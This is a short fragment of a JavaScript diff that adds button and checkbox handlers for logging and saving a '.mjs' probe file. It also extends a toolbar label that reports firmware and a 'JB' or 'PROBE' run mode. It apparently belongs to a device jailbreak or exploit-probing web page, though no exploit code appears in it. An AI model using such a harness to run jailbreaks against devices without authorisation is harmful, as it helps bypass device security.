+        document.getElementById("btnDownload").addEventListener("click", downloadLog);
+        document.getElementById("btnSaveMjs").addEventListener("click", function () {
+            if (!PROBE.finished) PROBE.finished = Date.now();
+            saveProbeMjs();
+        });
+        document.getElementById("btnCopy").addEventListener("click", copyLog);
+        document.getElementById("btnClear").addEventListener("click", clearLog);
+        document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
+            LOG.autoScroll = !!ev.target.checked;
+        });
+        document.getElementById("chkAutoSave").addEventListener("change", function (ev) {
+            LOG.autoSave = !!ev.target.checked;
+        });
+        document.getElementById("chkAutoMjs").addEventListener("change", function (ev) {
+            LOG.autoMjs = !!ev.target.checked;
+        });
+    } catch (_) {}
+})();
+
 try {
     document.getElementById("toolbarMeta").textContent =
-        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
+        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE") + " · mjs on";
 } catch (_) {}
 
 runAttempt();
